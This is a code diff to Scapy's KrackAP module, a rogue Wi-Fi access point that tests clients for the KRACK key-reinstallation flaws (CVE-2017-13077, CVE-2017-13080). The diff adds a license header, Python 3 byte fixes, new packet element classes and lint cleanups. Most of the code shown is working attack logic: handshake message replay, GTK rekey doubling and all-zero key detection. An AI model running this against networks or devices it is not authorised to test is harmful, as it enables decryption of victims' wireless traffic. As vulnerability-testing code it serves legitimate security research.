@@ -1,3 +1,7 @@
+# SPDX-License-Identifier: GPL-2.0-only
+# This file is part of Scapy
+# See https://scapy.net/ for more information
+
 import hmac
 import hashlib
 from itertools import count
@@ -11,15 +15,30 @@ from cryptography.hazmat.backends import default_backend
 from scapy.automaton import ATMT, Automaton
 from scapy.base_classes import Net
 from scapy.config import conf
-from scapy.compat import raw, hex_bytes, chb
+from scapy.compat import raw, chb
+from scapy.consts import LINUX
 from scapy.error import log_runtime
-from scapy.layers.dot11 import RadioTap, Dot11, Dot11AssoReq, Dot11AssoResp, \
-    Dot11Auth, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp
+from scapy.layers.dot11 import (
+    AKMSuite,
+    Dot11,
+    Dot11AssoReq,
+    Dot11AssoResp,
+    Dot11Auth,
+    Dot11Beacon,
+    Dot11Elt,
+    Dot11EltDSSSet,
+    Dot11EltRSN,
+    Dot11EltRates,
+    Dot11ProbeReq,
+    Dot11ProbeResp,
+    RSNCipherSuite,
+    RadioTap,
+)
 from scapy.layers.eap import EAPOL
 from scapy.layers.l2 import ARP, LLC, SNAP, Ether
 from scapy.layers.dhcp import DHCP_am
 from scapy.packet import Raw
-from scapy.utils import hexdump
+from scapy.utils import hexdump, mac2str
 from scapy.volatile import RandBin
 
 
@@ -57,16 +76,19 @@ class KrackAP(Automaton):
     The output logs will indicate if one of the CVE have been triggered.
     """
 
-    # Number of "GTK rekeying -> ARP replay" attempts. The vulnerability may not
+    # Number of "GTK rekeying -> ARP replay" attempts. The vulnerability may not  # noqa: E501
     # be detected the first time. Several attempt implies the client has been
     # likely patched
     ARP_MAX_RETRY = 50
 
     def __init__(self, *args, **kargs):
         kargs.setdefault("ll", conf.L2socket)
+        if not LINUX:
+            kargs.setdefault("monitor", True)
         super(KrackAP, self).__init__(*args, **kargs)
 
     def parse_args(self, ap_mac, ssid, passphrase,
+                   channel=None,
                    # KRACK attack options
                    double_3handshake=True,
                    encrypt_3handshake=True,
@@ -78,24 +100,33 @@ class KrackAP(Automaton):
                    **kwargs):
         """
         Mandatory arguments:
-        @iface: interface to use (must be in monitor mode)
-        @ap_mac: AP's MAC
-        @ssid: AP's SSID
-        @passphrase: AP's Passphrase (min 8 char.)
+
+        :param iface: interface to use (must be in monitor mode)
+        :param ap_mac: AP's MAC
+        :param ssid: AP's SSID
+        :param passphrase: AP's Passphrase (min 8 char.)
+
+        Optional arguments:
+
+        :param channel: used by the interface. Default 6
 
         Krack attacks options:
 
          - Msg 3/4 handshake replay:
-        double_3handshake: double the 3/4 handshake message
-        encrypt_3handshake: encrypt the second 3/4 handshake message
-        wait_3handshake: time to wait (in sec.) before sending the second 3/4
-         - double GTK rekeying:
-        double_gtk_refresh: double the 1/2 GTK rekeying message
-        wait_gtk: time to wait (in sec.) before sending the GTK rekeying
-        arp_target_ip: Client IP to use in ARP req. (to detect attack success)
-                       If None, use a DHCP server
-        arp_source_ip: Server IP to use in ARP req. (to detect attack success)
-                       If None, use the DHCP server gateway address
+
+        :param double_3handshake: double the 3/4 handshake message
+        :param encrypt_3handshake: encrypt the second 3/4 handshake message
+        :param wait_3handshake: time to wait (in sec.) before sending the
+            second 3/4
+
+        - double GTK rekeying:
+
+        :param double_gtk_refresh: double the 1/2 GTK rekeying message
+        :param wait_gtk: time to wait (in sec.) before sending the GTK rekeying
+        :param arp_target_ip: Client IP to use in ARP req. (to detect attack
+            success). If None, use a DHCP server
+        :param arp_source_ip: Server IP to use in ARP req. (to detect attack
+            success). If None, use the DHCP server gateway address
         """
         super(KrackAP, self).parse_args(**kwargs)
 
@@ -103,6 +134,9 @@ class KrackAP(Automaton):
         self.mac = ap_mac
         self.ssid = ssid
         self.passphrase = passphrase
+        if channel is None:
+            channel = 6
+        self.channel = channel
 
         # Internal structures
         self.last_iv = None
@@ -140,7 +174,7 @@ class KrackAP(Automaton):
 
     def run(self, *args, **kwargs):
         log_runtime.warning("AP started with ESSID: %s, BSSID: %s",
-                         self.ssid, self.mac)
+                            self.ssid, self.mac)
         super(KrackAP, self).run(*args, **kwargs)
 
     # Key utils
@@ -155,10 +189,10 @@ class KrackAP(Automaton):
         self.pmk = PBKDF2HMAC(
             algorithm=hashes.SHA1(),
             length=32,
-            salt=self.ssid,
+            salt=self.ssid.encode(),
             iterations=4096,
             backend=default_backend(),
-        ).derive(self.passphrase)
+        ).derive(self.passphrase.encode())
 
     def install_unicast_keys(self, client_nonce):
         """Use the client nonce @client_nonce to compute and install
@@ -167,8 +201,8 @@ class KrackAP(Automaton):
         pmk = self.pmk
         anonce = self.anonce
         snonce = client_nonce
-        amac = hex_bytes(self.mac.replace(":", ""))
-        smac = hex_bytes(self.client.replace(":", ""))
+        amac = mac2str(self.mac)
+        smac = mac2str(self.client)
 
         # Compute PTK
         self.ptk = customPRF512(pmk, amac, smac, anonce, snonce)
@@ -203,20 +237,18 @@ class KrackAP(Automaton):
     def build_ap_info_pkt(self, layer_cls, dest):
         """Build a packet with info describing the current AP
         For beacon / proberesp use
-        Assume the AP is on channel 6
         """
+        ts = int(time.time() * 1e6) & 0xffffffffffffffff
         return RadioTap() \
-              / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \
-              / layer_cls(timestamp=0, beacon_interval=100,
-                          cap='ESS+privacy') \
-              / Dot11Elt(ID="SSID", info=self.ssid) \
-              / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18$') \
-              / Dot11Elt(ID="DSset", info=b"\x06") \
-              / Dot11Elt(
-                  ID="RSNinfo",
-                  info=b'\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02'\
-                  b'\x01\x00\x00\x0f\xac\x02\x00\x00'
-              )
+            / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \
+            / layer_cls(timestamp=ts, beacon_interval=100,
+                        cap='ESS+privacy') \
+            / Dot11Elt(ID="SSID", info=self.ssid) \
+            / Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36]) \
+            / Dot11EltDSSSet(channel=self.channel) \
+            / Dot11EltRSN(group_cipher_suite=RSNCipherSuite(cipher=0x2),
+                          pairwise_cipher_suites=[RSNCipherSuite(cipher=0x2)],
+                          akm_suites=[AKMSuite(suite=0x2)])
 
     @staticmethod
     def build_EAPOL_Key_8021X2004(
@@ -228,14 +260,14 @@ class KrackAP(Automaton):
             key_data_encrypt=None,
             key_rsc=0,
             key_id=0,
-            key_descriptor_type=2, # EAPOL RSN Key
+            key_descriptor_type=2,  # EAPOL RSN Key
     ):
         pkt = EAPOL(version="802.1X-2004", type="EAPOL-Key")
 
         key_iv = KrackAP.gen_nonce(16)
 
-        assert key_rsc == 0 # Other values unsupported
-        assert key_id == 0 # Other values unsupported
+        assert key_rsc == 0  # Other values unsupported
+        assert key_id == 0  # Other values unsupported
         payload = b"".join([
             chb(key_descriptor_type),
             struct.pack(">H", key_information),
@@ -253,8 +285,8 @@ class KrackAP(Automaton):
 
         if data is None and key_mic is None and key_data_encrypt is None:
             # If key is unknown and there is no data, no MIC is needed
-            # Exemple: handshake 1/4
-            payload += b'\x00' * 2 # Length
+            # Example: handshake 1/4
+            payload += b'\x00' * 2  # Length
             return pkt / Raw(load=payload)
 
         assert data is not None
@@ -266,9 +298,9 @@ class KrackAP(Automaton):
         # Key Descriptor Version 1:
         # ...
         # No padding shall be used. The encryption key is generated by
-        # concatenating the EAPOL-Key IV field and the KEK. The first 256 octets
+        # concatenating the EAPOL-Key IV field and the KEK. The first 256 octets  # noqa: E501
         # of the RC4 key stream shall be discarded following RC4 stream cipher
-        # initialization with the KEK, and encryption begins using the 257th key
+        # initialization with the KEK, and encryption begins using the 257th key  # noqa: E501
         # stream octet.
         enc_data = ARC4_encrypt(key_iv + key_data_encrypt, data, skip=256)
 
@@ -280,7 +312,7 @@ class KrackAP(Automaton):
         temp_mic /= Raw(load=payload)
         to_mic = raw(temp_mic[EAPOL])
         mic = hmac.new(key_mic, to_mic, hashlib.md5).digest()
-        final_payload = payload[:offset_MIC] + mic + payload[offset_MIC + len(mic):]
+        final_payload = payload[:offset_MIC] + mic + payload[offset_MIC + len(mic):]  # noqa: E501
         assert len(final_payload) == len(payload)
 
         return pkt / Raw(load=final_payload)
@@ -291,11 +323,11 @@ class KrackAP(Automaton):
         Ref: 802.11i p81
         """
         return b''.join([
-            b'\xdd', # Type KDE
+            b'\xdd',  # Type KDE
             chb(len(self.gtk_full) + 6),
-            b'\x00\x0f\xac', # OUI
-            b'\x01', # GTK KDE
-            b'\x00\x00', # KeyID - Tx - Reserved x2
+            b'\x00\x0f\xac',  # OUI
+            b'\x01',  # GTK KDE
+            b'\x00\x00',  # KeyID - Tx - Reserved x2
             self.gtk_full,
         ])
 
@@ -314,7 +346,7 @@ class KrackAP(Automaton):
             addr1=dest,
             addr2=self.mac,
             addr3=self.mac,
-            FCfield="+".join(['wep'] + additionnal_flag),
+            FCfield="+".join(['protected'] + additionnal_flag),
             SC=(next(self.seq_num) << 4),
             subtype=0,
             type="Data",
@@ -345,10 +377,10 @@ class KrackAP(Automaton):
 
     def send_ether_over_wpa(self, pkt, **kwargs):
         """Send an Ethernet packet using the WPA channel
-        Extra arguments will be ignored, and are just left for compatibiliy
+        Extra arguments will be ignored, and are just left for compatibility
         """
 
-        payload = LLC()/SNAP()/pkt[Ether].payload
+        payload = LLC() / SNAP() / pkt[Ether].payload
         dest = pkt.dst
         if dest == "ff:ff:ff:ff:ff:ff":
             self.send_wpa_to_group(payload, dest)
@@ -360,7 +392,7 @@ class KrackAP(Automaton):
         # Send to DHCP server
         # LLC / SNAP to Ether
         if SNAP in pkt:
-            ether_pkt = Ether(src=self.client,dst=self.mac) / pkt[SNAP].payload
+            ether_pkt = Ether(src=self.client, dst=self.mac) / pkt[SNAP].payload  # noqa: E501
             self.dhcp_server.reply(ether_pkt)
 
         # If an ARP request is made, extract client IP and answer
@@ -371,7 +403,7 @@ class KrackAP(Automaton):
                 log_runtime.info("Detected IP: %s", self.arp_target_ip)
 
             # Reply
-            ARP_ans = LLC()/SNAP()/ARP(
+            ARP_ans = LLC() / SNAP() / ARP(
                 op="is-at",
                 psrc=self.arp_source_ip,
                 pdst=self.arp_target_ip,
@@ -447,7 +479,7 @@ class KrackAP(Automaton):
     @ATMT.receive_condition(WAIT_AUTH_REQUEST)
     def probe_request_received(self, pkt):
         # Avoid packet from other interfaces
-        if not RadioTap in pkt:
+        if RadioTap not in pkt:
             return
         if Dot11ProbeReq in pkt and pkt[Dot11Elt::{'ID': 0}].info == self.ssid:
             raise self.WAIT_AUTH_REQUEST().action_parameters(pkt)
@@ -460,7 +492,7 @@ class KrackAP(Automaton):
     @ATMT.receive_condition(WAIT_AUTH_REQUEST)
     def authent_received(self, pkt):
         # Avoid packet from other interfaces
-        if not RadioTap in pkt:
+        if RadioTap not in pkt:
             return
         if Dot11Auth in pkt and pkt.addr1 == pkt.addr3 == self.mac:
             raise self.AUTH_RESPONSE_SENT().action_parameters(pkt)
@@ -473,7 +505,7 @@ class KrackAP(Automaton):
         log_runtime.warning("Client %s connected!", self.client)
 
         # Launch DHCP Server
-        self.dhcp_server.run()
+        self.dhcp_server()
 
         rep = RadioTap()
         rep /= Dot11(addr1=self.client, addr2=self.mac, addr3=self.mac)
@@ -492,16 +524,16 @@ class KrackAP(Automaton):
     def send_assoc_response(self, pkt):
 
         # Get RSN info
-        temp_pkt = pkt[Dot11Elt::{"ID":48}].copy()
+        temp_pkt = pkt[Dot11Elt::{"ID": 48}].copy()
         temp_pkt.remove_payload()
         self.RSN = raw(temp_pkt)
         # Avoid 802.11w, etc. (deactivate RSN capabilities)
-        self.RSN = self.RSN[:-2] + "\x00\x00"
+        self.RSN = self.RSN[:-2] + b"\x00\x00"
 
         rep = RadioTap()
         rep /= Dot11(addr1=self.client, addr2=self.mac, addr3=self.mac)
         rep /= Dot11AssoResp()
-        rep /= Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96\x0c\x12\x18$')
+        rep /= Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36])
 
         self.send(rep)
 
@@ -523,7 +555,7 @@ class KrackAP(Automaton):
             SC=(next(self.seq_num) << 4),
         )
         rep /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
-        rep /= SNAP(OUI=0, code=0x888e) # 802.1X Authentication
+        rep /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication
         rep /= self.build_EAPOL_Key_8021X2004(
             key_information=0x89,
             replay_counter=next(self.replay_counter),
@@ -535,10 +567,10 @@ class KrackAP(Automaton):
     @ATMT.receive_condition(WPA_HANDSHAKE_STEP_1_SENT)
     def wpa_handshake_1_sent(self, pkt):
         # Avoid packet from other interfaces
-        if not RadioTap in pkt:
+        if RadioTap not in pkt:
             return
         if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
-           pkt[EAPOL].load[1] == "\x01":
+           pkt[EAPOL].load[1:2] == b"\x01":
             # Key MIC: set, Secure / Error / Request / Encrypted / SMK
             # message: not set
             raise self.WPA_HANDSHAKE_STEP_3_SENT().action_parameters(pkt)
@@ -555,8 +587,8 @@ class KrackAP(Automaton):
         # Data: full message with MIC place replaced by 0s
         # https://stackoverflow.com/questions/15133797/creating-wpa-message-integrity-code-mic-with-python
         client_mic = pkt[EAPOL].load[77:77 + 16]
-        client_data = raw(pkt[EAPOL]).replace(client_mic, "\x00" * len(client_mic))
-        assert hmac.new(self.kck, client_data, hashlib.md5).digest() == client_mic
+        client_data = raw(pkt[EAPOL]).replace(client_mic, b"\x00" * len(client_mic))  # noqa: E501
+        assert hmac.new(self.kck, client_data, hashlib.md5).digest() == client_mic  # noqa: E501
 
         rep = RadioTap()
         rep /= Dot11(
@@ -568,7 +600,7 @@ class KrackAP(Automaton):
         )
 
         rep /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
-        rep /= SNAP(OUI=0, code=0x888e) # 802.1X Authentication
+        rep /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication
 
         self.install_GTK()
         data = self.RSN
@@ -588,10 +620,10 @@ class KrackAP(Automaton):
     @ATMT.receive_condition(WPA_HANDSHAKE_STEP_3_SENT)
     def wpa_handshake_3_sent(self, pkt):
         # Avoid packet from other interfaces
-        if not RadioTap in pkt:
+        if RadioTap not in pkt:
             return
         if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
-           pkt[EAPOL].load[1:3] == "\x03\x09":
+           pkt[EAPOL].load[1:3] == b"\x03\x09":
             self.time_handshake_end = time.time()
             raise self.KRACK_DISPATCHER()
 
@@ -627,14 +659,14 @@ class KrackAP(Automaton):
             )
 
             rep /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
-            rep /= SNAP(OUI=0, code=0x888e) # 802.1X Authentication
+            rep /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication
 
             data = self.RSN
             data += self.build_GTK_KDE()
 
             eap_2 = self.build_EAPOL_Key_8021X2004(
                 # Key information 0x13c9:
-                #   ARC4 HMAC-MD5, Pairwise Key, Install, KEY ACK, KEY MIC, Secure,
+                #   ARC4 HMAC-MD5, Pairwise Key, Install, KEY ACK, KEY MIC, Secure,  # noqa: E501
                 #   Encrypted, SMK
                 key_information=0x13c9,
                 replay_counter=next(self.replay_counter),
@@ -662,15 +694,15 @@ class KrackAP(Automaton):
     @ATMT.receive_condition(ANALYZE_DATA)
     def get_data(self, pkt):
         # Avoid packet from other interfaces
-        if not RadioTap in pkt:
+        if RadioTap not in pkt:
             return
 
         # Skip retries
         if pkt[Dot11].FCfield.retry:
             return
 
-        # Skip unencrypted frames (TKIP rely on WEP packet)
-        if not pkt[Dot11].FCfield.wep:
+        # Skip unencrypted frames (TKIP rely on encrypted packets)
+        if not pkt[Dot11].FCfield.protected:
             return
 
         # Dot11.type 2: Data
@@ -683,17 +715,17 @@ class KrackAP(Automaton):
         # Get IV
         TSC, _, _ = parse_TKIP_hdr(pkt)
         iv = TSC[0] | (TSC[1] << 8) | (TSC[2] << 16) | (TSC[3] << 24) | \
-             (TSC[4] << 32) | (TSC[5] << 40)
+            (TSC[4] << 32) | (TSC[5] << 40)
         log_runtime.info("Got a packet with IV: %s", hex(iv))
 
         if self.last_iv is None:
             self.last_iv = iv
         else:
             if iv <= self.last_iv:
-                log_runtime.warning("IV re-use!! Client seems to be "
+                log_runtime.warning("IV reuse!! Client seems to be "
                                     "vulnerable to handshake 3/4 replay "
                                     "(CVE-2017-13077)"
-                )
+                                    )
 
         data_clear = None
 
@@ -707,9 +739,9 @@ class KrackAP(Automaton):
 
         # Decoding with a 0's TK
         if data_clear is None:
-            data = parse_data_pkt(pkt, "\x00" * len(self.tk))
+            data = parse_data_pkt(pkt, b"\x00" * len(self.tk))
             try:
-                mic_key = "\x00" * len(self.mic_sta_to_ap)
+                mic_key = b"\x00" * len(self.mic_sta_to_ap)
                 data_clear = check_MIC_ICV(data, mic_key, pkt.addr2, pkt.addr3)
                 log_runtime.warning("Client has installed an all zero "
                                     "encryption key (TK)!!")
@@ -728,7 +760,6 @@ class KrackAP(Automaton):
         log_runtime.debug(repr(pkt))
         self.deal_common_pkt(pkt)
 
-
     @ATMT.condition(RENEW_GTK)
     def gtk_pkt_1(self):
         raise self.WAIT_GTK_ACCEPT()
@@ -737,7 +768,7 @@ class KrackAP(Automaton):
     def send_renew_gtk(self):
 
         rep_to_enc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
-        rep_to_enc /= SNAP(OUI=0, code=0x888e) # 802.1X Authentication
+        rep_to_enc /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication
 
         data = self.build_GTK_KDE()
 
@@ -759,15 +790,15 @@ class KrackAP(Automaton):
     @ATMT.receive_condition(WAIT_GTK_ACCEPT)
     def get_gtk_2(self, pkt):
         # Avoid packet from other interfaces
-        if not RadioTap in pkt:
+        if RadioTap not in pkt:
             return
 
         # Skip retries
         if pkt[Dot11].FCfield.retry:
             return
 
-        # Skip unencrypted frames (TKIP rely on WEP packet)
-        if not pkt[Dot11].FCfield.wep:
+        # Skip unencrypted frames (TKIP rely on encrypted packets)
+        if not pkt[Dot11].FCfield.protected:
             return
 
         # Normal decoding
@@ -783,7 +814,7 @@ class KrackAP(Automaton):
 
         pkt_clear = LLC(data_clear)
         if EAPOL in pkt_clear and pkt.addr1 == pkt.addr3 == self.mac and \
-           pkt_clear[EAPOL].load[1:3] == "\x03\x01":
+           pkt_clear[EAPOL].load[1:3] == b"\x03\x01":
             raise self.WAIT_ARP_REPLIES()
 
     @ATMT.action(get_gtk_2)
@@ -792,7 +823,7 @@ class KrackAP(Automaton):
         if self.krack_state & 4 == 0:
             # Set the address for future uses
             self.arp_target_ip = self.dhcp_server.leases.get(self.client,
-                                                             self.arp_target_ip)
+                                                             self.arp_target_ip)  # noqa: E501
             assert self.arp_target_ip is not None
 
             # Send the first ARP requests, for control test
@@ -800,10 +831,10 @@ class KrackAP(Automaton):
                              self.arp_source_ip,
                              self.arp_target_ip)
             arp_pkt = self.send_wpa_to_group(
-                LLC()/SNAP()/ARP(op="who-has",
-                                 psrc=self.arp_source_ip,
-                                 pdst=self.arp_target_ip,
-                                 hwsrc=self.mac),
+                LLC() / SNAP() / ARP(op="who-has",
+                                     psrc=self.arp_source_ip,
+                                     pdst=self.arp_target_ip,
+                                     hwsrc=self.mac),
                 dest='ff:ff:ff:ff:ff:ff',
             )
             self.arp_sent.append(arp_pkt)
@@ -817,7 +848,7 @@ class KrackAP(Automaton):
                 self.arp_to_send = 0
                 self.arp_retry += 1
                 log_runtime.info("Trying to trigger CVE-2017-13080 %d/%d",
-                              self.arp_retry, self.ARP_MAX_RETRY)
+                                 self.arp_retry, self.ARP_MAX_RETRY)
                 if self.arp_retry > self.ARP_MAX_RETRY:
                     # We retries 100 times to send GTK, then already sent ARPs
                     log_runtime.warning("Client is likely not vulnerable to "
@@ -834,15 +865,15 @@ class KrackAP(Automaton):
     @ATMT.receive_condition(WAIT_ARP_REPLIES)
     def get_arp(self, pkt):
         # Avoid packet from other interfaces
-        if not RadioTap in pkt:
+        if RadioTap not in pkt:
             return
 
         # Skip retries
         if pkt[Dot11].FCfield.retry:
             return
 
-        # Skip unencrypted frames (TKIP rely on WEP packet)
-        if not pkt[Dot11].FCfield.wep:
+        # Skip unencrypted frames (TKIP rely on encrypted packets)
+        if not pkt[Dot11].FCfield.protected:
             return
 
         # Dot11.type 2: Data
